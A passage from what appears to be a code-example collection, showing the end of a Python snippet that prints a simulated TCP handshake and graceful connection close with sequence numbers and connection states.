    print("1. [SYN]      seq=1000, ack=0      -> State: SYN_SENT")
    print("2. [SYN, ACK] seq=5000, ack=1001   -> State: SYN_RCVD")
    print("3. [ACK]      seq=1001, ack=5001   -> State: ESTABLISHED")
    print("4. [FIN]      seq=1001, ack=5001   -> State: FIN_WAIT_1 -> TIME_WAIT (2*MSL)")
    print("Connection gracefully closed.")

if __name__ == "__main__":
    main()`,
  },
};
